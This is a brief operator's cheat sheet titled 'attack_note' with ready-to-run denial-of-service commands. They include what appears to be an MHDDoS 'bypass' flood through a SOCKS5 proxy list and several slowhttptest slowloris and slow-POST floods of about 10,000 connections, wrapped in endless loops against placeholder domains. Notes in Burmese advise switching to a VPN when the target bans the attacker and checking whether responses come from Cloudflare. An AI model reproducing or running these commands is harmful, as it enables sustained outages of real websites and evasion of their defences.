# attack_note

``` python3 start.py bypass https://?.com 5 101 socks5.txt 100 3600 true ```

``` while true; do python3 start.py bypass https://?.com 5 101 socks5.txt 100 3600 true; done ```



``` slowhttptest -c 10239 -l 36000 -H -x 24 -p 3 -r 20000 -t GET -i 10 -u http://?.com ```

``` while true; do slowhttptest -H -c 10239 -r 15321 -l 86400 -u http://?.com -s 512 -t GET -v 3; done ```

``` while true; do slowhttptest -B -c 10239 -r 15321 -l 86400 -u http://?.com -s 4096 -t POST -f application/x-www-form-urlencoded -x 4 -v 2; done; ```


# Other notes

``` 403 အမြဲပြနေတာက Server က Ban လို့ -> VPNနဲ့ ပြန်စမ်းကြည့် ```

``` 200 တွေဆိုလည်း ပြန်စစ်ဖို့လို  Cloudflare ဆီက လာတာ ဖြစ်နိုင်```
